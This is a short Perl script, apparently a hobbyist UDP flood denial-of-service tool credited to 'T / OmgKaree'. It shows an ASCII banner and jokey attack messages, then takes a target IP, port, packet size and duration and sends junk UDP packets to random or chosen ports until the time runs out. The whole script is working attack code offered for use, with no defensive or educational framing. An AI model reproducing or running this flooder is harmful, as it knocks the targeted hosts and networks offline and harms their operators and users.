#!/usr/bin/perl 

use Socket;
use strict;

if ($#ARGV != 3) {
  system("clear || cls");
print q{
printf "[0;31m
|__   __|          | \ | |  ____|__   __| | |
   | |     ______  |  \| | |__     | |    | |
   | |    |______| | . ` |  __|    | |    | |
   | |             | |\  | |____   | |    |_|
   |_|             |_| \_|______|  |_|    (_)
                                             
                                             
											 COMPLETE BY T / OmgKaree
					cr. T  FB : ทีนะครับ ที 
					cr . T Youtube : OmgKaree
					"\033[1;32m\033[0m\n\n";
 };
 print " \n";
 print "ยิงเลยปิ้ววๆๆๆๆๆๆๆๆๆ ( T ):) // \n\n";
 print "- SO FUN EIEIE\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Impossible de se connecter �  $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print  "ATTACK NET >>>>>>>>> $ip
BOOMMM !!!!!!!! " . ($port ? $port : "random"). " \n";

print " \n";
print  "T-nEt\n";
print "For Fun yep\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+2;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}